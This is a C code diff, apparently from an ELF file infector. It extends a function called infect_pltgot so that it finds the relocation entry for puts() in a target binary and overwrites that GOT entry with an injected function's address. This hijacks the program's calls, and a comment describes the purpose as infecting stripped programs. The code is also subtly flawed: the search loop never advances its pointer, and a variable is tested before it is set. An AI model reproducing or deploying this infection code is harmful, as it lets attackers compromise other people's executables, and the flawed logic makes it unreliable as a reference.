@@ -462,16 +462,19 @@ int load_target(const char *path, elfbin_t *elf)
  * directly so we can still infect programs that are stripped of section header
  * tables.
  */
-int infect_pltgot(elfbin_t *target)
+int infect_pltgot(elfbin_t *target, Elf64_Addr new_fn_addr)
 {
 	int i, symindex = -1;	
 	Elf64_Sym *symtab;
 	Elf64_Rela *jmprel;
 	Elf64_Dyn *dyn = target->dyn;
-	long *pltgot;
+	Elf64_Addr *gotentry, *pltgot;
 	char *strtab;
 	size_t strtab_size;
-
+	size_t jmprel_size;
+	Elf64_Addr gotaddr;
+	Elf64_Off gotoff;
+	
 	for (i = 0; dyn[i].d_tag != DT_NULL; i++) {
 		switch(dyn[i].d_tag) {
 			case DT_SYMTAB: // relative to the text segment base
@@ -489,6 +492,10 @@ int infect_pltgot(elfbin_t *target)
 			case DT_JMPREL:
 				jmprel = (Elf64_Rela *)&target->mem[dyn[i].d_un.d_ptr - target->textVaddr];
 				break;
+			case DT_PLTRELSZ:
+				jmprel_size = (size_t)dyn[i].d_un.d_val;
+				break;
+	
 		}
 	}
 	if (symtab == NULL || pltgot == NULL) {
@@ -506,8 +513,23 @@ int infect_pltgot(elfbin_t *target)
 		DEBUG_PRINT("cannot find puts()\n");
 		return -1;
 	}
+	for (i = 0; i < jmprel_size / sizeof(Elf64_Rela); i++) {
+		if (ELF64_R_SYM(jmprel->r_info) == symindex) { // found rel entry for puts()
+			gotaddr = jmprel->r_offset;
+			gotoff = target->dataOff + (jmprel->r_offset - target->dataVaddr);
+			break;
+		}
+	}
+	if (gotaddr == 0) {
+		DEBUG_PRINT("Couldn't find relocation entry for puts\n");
+		return -1;
+	}
 	
+	gotentry = (Elf64_Addr *)&target->mem[gotoff];
+	*gotentry = new_fn_addr;
 	
+	DEBUG_PRINT("patched GOT entry %x with address %x\n", gotaddr, new_fn_addr);
+	return 0;
 	
 }
 /*
